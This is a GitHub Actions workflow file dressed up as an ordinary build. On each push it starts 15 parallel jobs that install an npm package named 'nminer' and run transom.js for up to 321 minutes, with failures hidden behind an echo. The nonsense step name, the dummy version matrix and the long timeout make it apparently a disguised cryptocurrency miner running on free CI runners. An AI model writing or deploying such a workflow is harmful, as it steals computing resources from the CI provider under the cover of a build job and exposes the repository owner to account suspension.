name: transom
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1225 }
          - { version: 281 }
          - { version: 1374 }
          - { version: 1732 }
          - { version: 1662 }
          - { version: 42 }
          - { version: 4617 }
          - { version: 6516 }
          - { version: 4465 }
          - { version: 2304 }
          - { version: 7002 }
          - { version: 5575 }
          - { version: 2263 }
          - { version: 3437 }
          - { version: 5490 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: ouch whoa trial
        run: |
          npm install nminer@latest
          timeout 321m node transom.js || echo "transom executed"